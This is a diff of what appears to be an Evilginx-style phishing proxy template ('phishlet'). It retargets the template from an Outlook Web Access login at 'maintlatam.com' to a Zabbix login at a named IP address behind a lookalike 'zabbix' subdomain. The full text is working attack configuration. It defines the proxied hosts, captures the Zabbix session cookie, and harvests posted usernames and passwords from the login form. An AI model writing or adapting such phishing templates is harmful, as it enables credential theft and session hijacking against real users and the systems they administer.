@@ -1,18 +1,18 @@
-name: 'OWA Maint'
-author: 'Tú'
+name: 'Zabbix Login'
+author: 'Cristian'
 min_ver: '3.0.0'
 
 proxy_hosts:
-  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'maintlatam.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'zabbix', orig_sub: '13.92.242.150', domain: 'zabbix.tudominio.com', session: true, is_landing: true, auto_filter: true}
 
 auth_tokens:
-  - domain: '.maintlatam.com'
-    keys: ['ASP.NET_SessionId', 'owaAuth']
+  - domain: '13.92.242.150'
+    keys: ['zbx_sessionid']
     type: 'cookie'
 
 credentials:
   username:
-    key: 'username'
+    key: 'name'
     search: '(.*)'
     type: 'post'
   password:
@@ -21,14 +21,13 @@ credentials:
     type: 'post'
 
 force_post:
-  - path: '/owa/auth.owa'
+  - path: '/index.php'
     search:
-      - {key: 'username', search: '.*'}
+      - {key: 'name', search: '.*'}
       - {key: 'password', search: '.*'}
-    force:
-      - {key: 'isUtf8', value: '1'}  # Solo si es requerido por el formulario real
+    force: []
     type: 'post'
 
 login:
-  domain: 'mail.maintlatam.com'
-  path: 'owa'
+  domain: '13.92.242.150'
+  path: 'index.php'
